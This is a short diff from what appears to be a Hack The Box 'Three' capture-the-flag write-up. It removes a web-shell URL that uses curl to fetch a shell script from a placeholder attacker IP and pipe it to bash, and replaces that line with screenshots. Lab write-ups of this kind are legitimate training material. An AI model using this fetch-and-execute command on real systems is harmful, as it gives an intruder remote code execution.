@@ -105,7 +105,10 @@ _by this command will start http server **python3 -m http.server 8000**_
 
 _we will use **curl** to fetch the bash file and do that in browser by this_
 
-**http://thetoppers.htb/shell.php?cmd=curl%20MY_IP:8000/shell.sh|bash**_ 
+
+
+![](/Assets/HTB/THREE/assets/sh.png)
+
 
 ![](/Assets/HTB/THREE/assets/remote1.png)
 
